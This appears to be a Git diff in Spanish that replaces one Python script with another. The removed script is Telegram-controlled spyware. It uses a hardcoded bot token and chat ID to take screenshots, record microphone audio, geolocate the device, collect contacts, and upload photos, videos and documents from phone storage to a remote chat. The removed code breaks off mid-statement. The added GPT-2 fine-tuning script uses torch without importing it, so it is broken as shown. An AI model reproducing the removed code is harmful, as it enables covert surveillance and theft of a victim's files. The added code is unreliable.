@@ -1,111 +1,66 @@
-import os
-import glob
-import json
-import telegram
-from contacts import Contacts
-from PIL import ImageGrab
-import requests
-import psutil
-import time
-import telegram.ext
-import subprocess
+from transformers import GPT2LMHeadModel, GPT2Tokenizer
 
-# Configura tu token de acceso al bot
-TOKEN = '7016184289:AAGdf0Pl6m6uN4JVZf55NdmxAdCwYHc8PDQ'
+# Paso 1: Cargar el modelo pre-entrenado y el tokenizador
+modelo = GPT2LMHeadModel.from_pretrained("gpt2")
+tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
 
-# Configura tu ID de chat
-CHAT_ID = '5827778078'
+# Paso 2: Preparar los datos de entrenamiento
+preguntas = [
+    "¿Cuál es tu nombre?",
+    "¿Cuál es la capital de Francia?",
+    "¿Cuánto es 2 + 2?"
+]
+respuestas = [
+    "Mi nombre es Jarvis",
+    "La capital de Francia es París",
+    "2 + 2 es igual a 4"
+]
 
-# Ruta al directorio donde se encuentran los archivos a enviar
-DIRECTORIO_ARCHIVOS = '/storage/emulated/0/ruta/al/directorio'
+datos_entrenamiento = []
+for pregunta, respuesta in zip(preguntas, respuestas):
+    entrada = pregunta + " " + respuesta
+    datos_entrenamiento.append(entrada)
 
-# Crea una instancia del bot
-bot = telegram.Bot(token=TOKEN)
+# Paso 3: Tokenizar los datos de entrenamiento
+tokens_entrenamiento = tokenizer.batch_encode_plus(
+    datos_entrenamiento,
+    padding=True,
+    truncation=True,
+    max_length=512,
+    return_tensors="pt"
+)
 
-# Crea una instancia de la clase Contacts
-contactos = Contacts()
+# Paso 4: Entrenar el modelo con los datos de entrenamiento
+inputs = tokens_entrenamiento["input_ids"]
+mascaras_atencion = tokens_entrenamiento["attention_mask"]
 
-# Función para tomar una captura de pantalla
-def tomar_captura():
-    # Toma la captura de pantalla utilizando la biblioteca PIL
-    captura = ImageGrab.grab()
-    # Guarda la captura de pantalla en un archivo temporal
-    captura_path = os.path.join(DIRECTORIO_ARCHIVOS, 'captura.png')
-    captura.save(captura_path)
-    # Envía la captura de pantalla al chat utilizando el método send_photo
-    with open(captura_path, 'rb') as photo:
-        bot.send_photo(chat_id=CHAT_ID, photo=photo)
-    # Elimina el archivo temporal de la captura de pantalla
-    os.remove(captura_path)
+modelo.train()
+modelo.resize_token_embeddings(len(tokenizer))
 
-# Función para obtener la latitud y longitud de la IP
-def obtener_latitud_longitud():
-    response = requests.get('https://ipapi.co/json/')
-    data = response.json()
-    latitude = data['latitude']
-    longitude = data['longitude']
-    return latitude, longitude
+optimizador = torch.optim.AdamW(modelo.parameters(), lr=1e-5)
 
-# Función para obtener el porcentaje de batería del celular
-def obtener_porcentaje_bateria():
-    battery = psutil.sensors_battery()
-    percentage = battery.percent
-    return percentage
+for epoch in range(3):
+    optimizador.zero_grad()
+    outputs = modelo(inputs, attention_mask=mascaras_atencion, labels=inputs)
+    perdida = outputs.loss
+    perdida.backward()
+    optimizador.step()
 
-# Función para grabar audio
-def grabar_audio():
-    subprocess.run(["termux-microphone-record", "audio.wav"])
+# Paso 5: Hacer preguntas y obtener respuestas del modelo entrenado
+pregunta = "¿Cuál es la capital de Perú?"
+entrada_pregunta = pregunta + " "
 
-# Función para procesar los comandos recibidos
-def procesar_comando(update, context):
-    # Obtiene el comando enviado por el usuario
-    comando = update.message.text
-    # Verifica si el comando es "/captura"
-    if comando == '/captura':
-        # Toma la captura de pantalla
-        tomar_captura()
-    # Verifica si el comando es "/grabaaudio"
-    elif comando == '/grabaaudio':
-        # Grabar audio
-        grabar_audio()
+tokens_pregunta = tokenizer.encode(entrada_pregunta, return_tensors="pt")
 
-# Configura el manejador de comandos del bot
-dispatcher = telegram.ext.Dispatcher(bot, None, workers=0)
-dispatcher.add_handler(telegram.ext.CommandHandler('captura', procesar_comando))
-dispatcher.add_handler(telegram.ext.CommandHandler('grabaaudio', procesar_comando))
+modelo.eval()
+respuesta = modelo.generate(
+    tokens_pregunta,
+    max_length=100,
+    num_beams=5,
+    no_repeat_ngram_size=2,
+    early_stopping=True
+)
 
-# Inicia el bot
-updater = telegram.ext.Updater(bot=bot, use_context=True, dispatcher=dispatcher)
-updater.start_polling()
+respuesta_decodificada = tokenizer.decode(respuesta[0], skip_special_tokens=True)
 
-# Obtén la lista de archivos en el directorio
-archivos = glob.glob(os.path.join(DIRECTORIO_ARCHIVOS, '*'))
-
-# Itera sobre los archivos y envíalos al bot
-for archivo in archivos:
-    # Verifica si el archivo es una foto, video, archivo o contacto
-    if archivo.endswith(('.jpg', '.jpeg', '.png')):
-        # Si es una foto, utiliza el método send_photo
-        with open(archivo, 'rb') as photo:
-            bot.send_photo(chat_id=CHAT_ID, photo=photo)
-    elif archivo.endswith(('.mp4', '.avi', '.mov')):
-        # Si es un video, utiliza el método send_video
-        with open(archivo, 'rb') as video:
-            bot.send_video(chat_id=CHAT_ID, video=video)
-    elif archivo.endswith(('.py', '.txt', '.pdf', '.apk', '.docx', '.html')):
-        # Si es un archivo con una de las extensiones especificadas, utiliza el método send_document
-        with open(archivo, 'rb') as document:
-            bot.send_document(chat_id=CHAT_ID, document=document)
-    elif archivo.endswith('.json'):
-        # Si es un archivo JSON, verifica si contiene contactos
-        with open(archivo, 'r') as json_file:
-            data = json.load(json_file)
-            if 'contacts' in data:
-                # Si contiene contactos, agrega los contactos a la instancia de Contacts
-                contactos.add_contacts(data['contacts'])
-
-# Convierte los contactos a formato JSON
-contactos_json = contactos.to_json()
-
-# Guarda los contactos en un archivo JSON
-with open ("contactos.json","w") as archivo_json:
+print(respuesta_decodificada)
